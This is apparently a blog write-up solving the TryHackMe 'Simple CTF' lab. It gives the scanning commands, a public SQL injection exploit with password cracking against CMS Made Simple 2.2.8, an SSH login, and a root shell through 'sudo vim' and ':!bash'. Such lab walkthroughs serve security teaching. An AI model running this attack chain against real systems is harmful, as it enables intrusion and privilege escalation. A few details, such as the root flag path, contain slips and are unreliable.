---
title: "Simple CTF - TryHackMe"
date: 2026-03-21 10:35:00 +0000
categories: [TryHackMe, Writeups]
tags: [ctf, web, sqli, ssh, privilege-escalation]
image: /assets/img/writeups/covers/simple-ctf.jpeg
---

# Simple CTF - TryHackMe
![1.png](/assets/img/writeups/simple-ctf/1.png)
**Difficulty**: Easy
**Time Required**: 25 min
## Recon
Start enumerating with nmap using the syntax
`nmap -T4 -sV -p- 10.67.153.113`
![2.png](/assets/img/writeups/simple-ctf/2.png)
**Q1**: How many services are running under port 1000?
![3.png](/assets/img/writeups/simple-ctf/3.png)
**Q2**: What is running on the higher port?
![4.png](/assets/img/writeups/simple-ctf/4.png)
**Q3**: What's the CVE you're using against the application?
Notice that there is a web server running on port 80.
![5.png](/assets/img/writeups/simple-ctf/5.png)
We want to know the version of web software so that we can further exploit it.
Enumerate directory using gobuster with the following syntax
`gobuster dir -u 10.67.153.113:80 -w /usr/share/wordlists/dirb/common.txt`

- **dir** for directory enumeration
- **-u** for URL
- **-w** for wordlist

![6.png](/assets/img/writeups/simple-ctf/6.png)
There is directory on the web server with the name `/simple`
Visiting this directory gives us the version of the web software
![7.png](/assets/img/writeups/simple-ctf/7.png)
Now, we need to check for the exploits available for the `CMS Made Simple version 2.2.8`
Visit https://www.exploit-db.com/ and search with the keyword **CMS Made** and find the exploit that matches over web software's version.
![8.png](/assets/img/writeups/simple-ctf/8.png)
Open that exploit and copy the **CVE**.
![9.png](/assets/img/writeups/simple-ctf/9.png)
**Q4**: To what kind of vulnerability is the application vulnerable?
  ![10.png](/assets/img/writeups/simple-ctf/10.png)
SQL injection is often referred to as SQLi
## Exploitation
**Q5**: What's the password?
 ![11.png](/assets/img/writeups/simple-ctf/11.png)
  Download this exploit and run it with python.
  `python 46635.py -u http://10.67.153.113/simple/ --crack -w /usr/share/wordlists/rockyou.txt`
  Specify the url with **-u** and wordlist with **-w** flag.
### Error 
  If you are getting an error try running it with python2 and edit the exploit like this
  - Remove this completely from the script (on Line: 2) `on from termcolor import colored` and `from termcolor import cprint` (Line: 4).
  - Search for these lines and change them like this:

```
cprint(output,'green', attrs=['bold'])
cprint('[*] Try: ' + value, 'red', attrs=['bold'])
cprint(output,'green', attrs=['bold'])`
print colored("[*] Now try to crack password")
  ````
Change these lines to
````
print(output)
print('[*] Try: ' + value)
print(output)
print ("[*] Now try to crack password")
````

Now run it with `python2 46635.py -u http://10.67.153.113/simple/ --crack -w /usr/share/wordlists/rockyou.txt`
**Output**:
![12.png](/assets/img/writeups/simple-ctf/12.png)
**Q6**: Where can you login with the details obtained?<br>You can log in via SSH, as we previously identified that the machine was running SSH.<br>**Q7**: What's the user flag?
<br>Run this command to get the user flag
`cat /home/mitch/user.txt`.<br>**Q8**: Is there any other user in the home directory? What's its name?<br>Run this command to see other users `ls /home`.<br>**Q9**: What can you leverage to spawn a privileged shell?<br>Run this command to find out what mitch can run `sudo -l`.
````
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
````

**Q10**: >What's the root flag?<br>Use vim with sudo to get a root shell.
`sudo vim` and type `:!bash` to spawn shell as root.
![13.png](/assets/img/writeups/simple-ctf/13.png)
Finally run the command `cat /root/user.txt` to get the root flag.
